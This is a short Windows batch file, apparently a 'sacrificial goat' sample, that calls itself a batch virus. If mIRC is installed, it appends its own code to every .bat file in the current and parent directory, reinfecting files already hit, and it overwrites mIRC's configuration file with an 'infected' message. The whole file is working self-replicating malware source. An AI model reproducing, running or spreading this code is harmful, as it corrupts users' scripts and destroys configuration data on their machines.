REM ==========================================
REM ==========================================
REM ======= SACRIFICIAL GOAT =================
REM ==========================================
REM ==========================================
@echo off
rem This is a dumb batch virus
rem it even reinfects the same files
if exist c:\mirc\mirc32.exe goto infect
if not exist c:\mirc\mirc32.exe goto noinfect
:infect
for %%i in (*.bat ../*.bat) do copy %%i+%0 %%i>nul
echo you are infected by the reinfector :) >c:\mirc\mirc.ini
:noinfect
cls